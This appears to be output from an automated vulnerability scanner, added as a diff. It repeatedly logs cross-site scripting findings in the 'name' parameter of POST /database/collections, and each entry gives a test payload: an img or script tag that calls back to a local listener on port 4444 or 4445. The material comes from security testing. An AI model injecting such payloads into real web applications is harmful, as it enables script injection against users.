@@ -1,0 +1,156 @@
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/database/collectionsLLMname'>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/database/collectionsLLMname'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/database/collectionsLLMname'>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/database/collectionsLLMname'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/database/collectionsLLMname'</script>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/database/collectionsLLMname'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/database/collectionsLLMname'>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/database/collectionsLLMname'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/database/collectionsLLMname'>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/database/collectionsLLMname'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/database/collectionsLLMname'</script>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/database/collectionsLLMname'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/database/collectionsLLMname'>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/database/collectionsLLMname'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/database/collectionsLLMname'>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/database/collectionsLLMname'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/database/collectionsLLMname'</script>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/database/collectionsLLMname'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/database/collectionsLLMname'>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/database/collectionsLLMname'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/database/collectionsLLMname'>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/database/collectionsLLMname'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/database/collectionsLLMname'</script>
+
+API Vul Type: xss
+Vul API Url: /database/collections
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/database/collectionsLLMname'</script>
+
